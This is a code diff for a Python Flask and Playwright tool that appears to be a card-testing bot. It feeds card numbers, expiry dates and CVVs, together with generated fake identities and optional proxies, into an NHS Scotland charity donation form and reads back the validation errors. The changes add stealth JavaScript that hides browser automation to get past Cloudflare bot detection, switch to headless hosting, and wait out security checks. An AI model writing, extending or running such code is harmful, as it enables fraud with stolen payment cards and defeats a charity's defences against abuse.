@@ -1,9 +1,9 @@
 import asyncio
+import os
 import re
 import time
 import random
 import textwrap
-import os 
 import logging as flask_logging
 from flask import Flask, request, jsonify
 from playwright.async_api import async_playwright
@@ -43,6 +43,19 @@ def bot_log(step, message, emoji=""):
 def print_separator():
     print(f"\n{Colors.CYAN}{'='*15} API BY UNIX DEV TEAM {'='*15}{Colors.RESET}\n")
 
+# FIX: Stealth JS yang lebih kuat untuk bypass Cloudflare Railway
+STEALTH_JS = """
+Object.defineProperty(navigator, 'webdriver', { get: () => undefined });
+Object.defineProperty(navigator, 'languages', { get: () => ['en-US', 'en'] });
+Object.defineProperty(navigator, 'plugins', { get: () => [1, 2, 3, 4, 5] });
+window.chrome = { runtime: {} };
+const originalQuery = window.navigator.permissions.query;
+window.navigator.permissions.query = (parameters) =>
+    parameters.name === 'notifications'
+        ? Promise.resolve({ state: Notification.permission })
+        : originalQuery(parameters);
+"""
+
 def generate_fake_identity():
     first_names = ["James", "Mary", "John", "Patricia", "Robert", "Jennifer", "Michael", "Linda", "William", "Elizabeth"]
     last_names = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Rodriguez", "Martinez"]
@@ -75,7 +88,8 @@ async def process_nhscot_donation(cc, mm, yy, cvv, proxy_str=None):
     bot_log("INIT", f"Generated Identity: {fake_id['first_name']} {fake_id['last_name']}", "[👤]")
     
     async with async_playwright() as p:
-        launch_args = {"headless": False}
+        # Railway memerlukan headless: True
+        launch_args = {"headless": True}
         context_args = {"ignore_https_errors": True}
         
         if proxy_str:
@@ -96,6 +110,10 @@ async def process_nhscot_donation(cc, mm, yy, cvv, proxy_str=None):
 
         browser = await p.chromium.launch(**launch_args)
         context = await browser.new_context(**context_args)
+        
+        # Inject Stealth JS
+        await context.add_init_script(STEALTH_JS)
+        
         page = await context.new_page()
         
         await page.route("**/*.{png,jpg,jpeg,gif,svg}", lambda route: route.abort())
@@ -106,7 +124,12 @@ async def process_nhscot_donation(cc, mm, yy, cvv, proxy_str=None):
         try:
             # PERINGKAT 1: Pergi ke halaman donasi
             bot_log("POST", "Step 1: Navigating to Donation Form...", "[🚀]")
-            await page.goto(target_url, timeout=60000, wait_until="domcontentloaded")
+            try:
+                # FIX: Guna 'commit' supaya tak crash bila Cloudflare tunjuk page "Checking browser"
+                await page.goto(target_url, timeout=60000, wait_until="commit")
+            except Exception as e:
+                bot_log("WAIT", "Cloudflare security check detected. Waiting...", "[🛡️]")
+                await asyncio.sleep(10) # Tunggu Cloudflare selesai check
             
             # Tunggu borang Gravity Forms load
             bot_log("WAIT", "Waiting for Form to render...", "[⏳]")
@@ -259,6 +282,7 @@ async def process_nhscot_donation(cc, mm, yy, cvv, proxy_str=None):
             try:
                 await page.wait_for_selector(".gfield_validation_message, .validation_message", timeout=30000)
                 
+                # FIX: Ambil teks asal (raw) dari laman web
                 error_element = await page.query_selector(".gfield_validation_message, .validation_message")
                 if error_element:
                     raw_error_msg = await error_element.inner_text()
